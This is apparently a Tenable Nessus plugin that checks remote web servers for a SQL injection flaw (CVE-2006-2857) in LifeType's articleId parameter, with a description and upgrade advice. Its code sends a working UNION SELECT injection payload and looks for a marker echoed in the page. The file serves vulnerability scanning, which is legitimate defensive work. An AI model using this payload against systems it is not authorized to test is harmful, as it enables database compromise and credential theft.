#
# (C) Tenable Network Security
#


if (description)
{
  script_id(21631);
  script_version("$Revision: 1.3 $");

  script_cve_id("CVE-2006-2857");
  script_bugtraq_id(18264);

  script_name(english:"LifeType articleId Parameter SQL Injection Vulnerability");
  script_summary(english:"Tries to exploit SQL injection issue in LifeType");
 
  desc = "
Synopsis :

The remote web server contains a PHP script that is prone to SQL
injection attacks. 

Description :

The remote host is running LifeType, an open-source blogging platform
written in PHP. 

The version of LifeType installed on the remote fails to sanitize
user-supplied input to the 'articleId' parameter of the 'index.php'
script before using it to construct database queries.  Regardless of
PHP's 'magic_quotes_gpc' setting, an unauthenticated attacker can
exploit this flaw to manipulate database queries and, for example,
recover the administrator's password hash. 

See also :

http://www.securityfocus.com/archive/1/435874/30/0/threaded
http://www.nessus.org/u?93202a4a

Solution :

Upgrade to LifeType version 1.0.5 or later.

Risk factor : 

Medium / CVSS Base Score : 5 
(AV:R/AC:L/Au:NR/C:P/A:N/I:P/B:N)";
  script_description(english:desc);

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2006 Tenable Network Security");

  script_dependencies("http_version.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}


include("global_settings.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("url_func.inc");


port = get_http_port(default:80);
if (!get_port_state(port)) exit(0);
if (!can_host_php(port:port)) exit(0);


# Loop through directories.
if (thorough_tests) dirs = make_list("/lifetype", "/blog", cgi_dirs());
else dirs = make_list(cgi_dirs());

foreach dir (dirs) {
  # Try to exploit the flaw.
  magic = unixtime();
  exploit = string("/**/UNION/**/SELECT/**/", magic, ",1,1,1,1,1,1,1/*");
  req = http_get(
    item:string(
      dir, "/index.php?",
      "op=ViewArticle&",
      "articleId=9999", urlencode(str:exploit), "&",
      "blogId=1"
    ),
    port:port
  );
  res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
  if (res == NULL) exit(0);

  # There's a problem if...
  if (
    # it looks like LifeType and...
    '<meta name="generator" content="lifetype' >< res &&
    # it uses our string for an article id
    string('articleId=', magic, '&amp;blogId=1">Permalink') >< res
  )
  {
    security_warning(port);
    exit(0);
  }
}
